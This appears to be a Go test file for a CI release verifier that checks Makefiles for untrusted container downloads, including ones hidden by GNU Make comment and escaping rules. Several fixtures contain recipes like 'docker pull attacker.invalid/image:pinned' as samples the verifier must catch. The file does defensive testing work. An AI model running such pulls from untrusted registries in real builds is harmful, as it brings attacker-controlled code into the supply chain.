package releaseverify

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"testing"
)

func TestVerifyCIContainerDownloadsHasNoHostGNUmakeDependency(t *testing.T) {
	fakeDir := t.TempDir()
	marker := filepath.Join(fakeDir, "path-make-used")
	writeFixtureExecutable(t, filepath.Join(fakeDir, "make"), fmt.Sprintf("#!/bin/sh\nprintf used >%q\nexit 97\n", marker))
	t.Setenv("PATH", fakeDir+string(os.PathListSeparator)+os.Getenv("PATH"))
	if err := VerifyCIContainerDownloads(writeCIContainerDownloadsFixture(t)); err != nil {
		t.Fatalf("release verification depended on a PATH make: %v", err)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatal("release verification executed PATH make")
	}

	_, source, _, _ := runtime.Caller(0)
	paths, err := filepath.Glob(filepath.Join(filepath.Dir(source), "ci_container_make*.go"))
	if err != nil {
		t.Fatal(err)
	}
	for _, path := range paths {
		if strings.HasSuffix(path, "_test.go") {
			continue
		}
		contents := readFixtureFile(t, path)
		for _, forbidden := range []string{"/usr/bin/make", "os/exec", "exec.Command", "exec.LookPath"} {
			if strings.Contains(contents, forbidden) {
				t.Fatalf("production Make policy %s retains host GNU Make dependency %q", filepath.Base(path), forbidden)
			}
		}
	}
	unitPaths, err := filepath.Glob(filepath.Join(filepath.Dir(source), "*_test.go"))
	if err != nil {
		t.Fatal(err)
	}
	hostMakeCall := regexp.MustCompile(`exec\.(?:Command|CommandContext|LookPath)\([^\n]*"make"`)
	for _, path := range unitPaths {
		contents := readFixtureFile(t, path)
		want := 0
		if filepath.Base(path) == "ci_container_make_target_variables_test.go" {
			want = 1
		}
		if got := len(hostMakeCall.FindAllString(contents, -1)); got != want {
			t.Fatalf("host GNU Make semantic probes in %s = %d, want %d", filepath.Base(path), got, want)
		}
	}
}

func TestMakePolicyNormalizationClosureOracle(t *testing.T) {
	_, source, _, _ := runtime.Caller(0)
	directory := filepath.Join(filepath.Dir(source), "testdata")
	parsed, err := readActiveMakefile(filepath.Join(directory, "make_policy_normalization.mk"))
	if err != nil {
		t.Fatal(err)
	}
	var snapshot strings.Builder
	for _, name := range []string{"ENGINE", "ESCAPED", "SPACED"} {
		fmt.Fprintf(&snapshot, "variable %s=%q\n", name, parsed.variables[name])
	}
	targets := make([]string, 0, len(parsed.targets))
	for name := range parsed.targets {
		targets = append(targets, name)
	}
	sort.Strings(targets)
	for _, name := range targets {
		target := parsed.targets[name]
		fmt.Fprintf(&snapshot, "target %s dependencies=%q recipes=%q\n", name, target.dependencies, target.recipes)
	}
	protected := map[string]struct{}{"test-pg": {}}
	inline := parsed.targets["inline"].recipes[0]
	continued := parsed.targets["continued"].recipes[0]
	recursive := parsed.targets["recursive"].recipes[0]
	alternate := parsed.targets["alternate"].recipes[0]
	fmt.Fprintf(&snapshot, "classification inline-acquires=%t\n", makeRecipeAcquiresContainer(parsed, inline))
	fmt.Fprintf(&snapshot, "classification continued-acquires=%t\n", makeRecipeAcquiresContainer(parsed, continued))
	fmt.Fprintf(&snapshot, "classification recursive-reaches-protected=%t\n", commandInvokesProtectedMakeTarget(normalizedMakeRecipe(recursive), protected))
	fmt.Fprintf(&snapshot, "classification alternate-untrusted-graph=%t\n", commandInvokesProtectedMakeTarget(normalizedMakeRecipe(alternate), protected))

	want := readFixtureFile(t, filepath.Join(directory, "make_policy_normalization.golden"))
	if snapshot.String() != want {
		t.Fatalf("hermetic Make-policy normalization/closure oracle drifted:\n%s\nwant:\n%s", snapshot.String(), want)
	}
}

func TestVerifyCIContainerDownloadsUsesGNUmakeCommentsForContainerClosure(t *testing.T) {
	tests := map[string]string{
		"adjacent assignment comment": `.PHONY: android acquire
ENGINE := docker#comment
acquire:
	$(ENGINE) pull attacker.invalid/image:pinned
android: acquire
	@true
`,
		"adjacent prerequisite comment": `.PHONY: android acquire
acquire:
	docker pull attacker.invalid/image:pinned
android: acquire#comment
	@true
`,
		"whitespace assignment and prerequisite comments": `.PHONY: android acquire
ENGINE := docker # comment
acquire:
	$(ENGINE) pull attacker.invalid/image:pinned
android: acquire # comment
	@true
`,
	}
	for name, source := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeMakeHashPolicyFixture(t, source)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads lost an acquisition route hidden by GNU Make comments")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsDistinguishesEscapedMakeHashesFromShellHashes(t *testing.T) {
	tests := map[string]string{
		"escaped assignment hash is data": `.PHONY: android acquire
ENGINE := docker\#comment
acquire:
	$(ENGINE) pull attacker.invalid/image:pinned
android: acquire
	@true
`,
		"adjacent shell recipe hash is data": `.PHONY: android
android:
	@printf '%s\n' docker#comment
`,
	}
	for name, source := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeMakeHashPolicyFixture(t, source)
			if err := VerifyCIContainerDownloads(root); err != nil {
				t.Fatalf("VerifyCIContainerDownloads confused escaped Make or adjacent shell hash data with a comment: %v", err)
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsUnauditedMakeHashContexts(t *testing.T) {
	tests := map[string]string{
		"continued assignment":       ".PHONY: android\nENGINE := dock\\\ner#comment\nandroid:\n\t@true\n",
		"commented target separator": ".PHONY: android\nandroid#comment:\n\t@true\n",
		"define body":                ".PHONY: android\ndefine ENGINE\ndocker#comment\nendef\nandroid:\n\t@true\n",
		"eval assignment":            ".PHONY: android\n$(eval ENGINE := docker#comment)\nandroid:\n\t@true\n",
	}
	for name, source := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeMakeHashPolicyFixture(t, source)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted unaudited GNU Make hash context")
			}
		})
	}
}

func writeMakeHashPolicyFixture(t *testing.T, source string) string {
	t.Helper()
	root := writeCIContainerDownloadsFixture(t)
	writeFixtureFile(t, filepath.Join(root, "mk", "hash-comments.mk"), source)
	makefile := filepath.Join(root, "Makefile")
	writeFixtureFile(t, makefile, strings.TrimSpace(readFixtureFile(t, makefile))+"\ninclude mk/hash-comments.mk\n")
	writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), readRepositoryWorkflow(t, "ci-android.yml"))
	return root
}
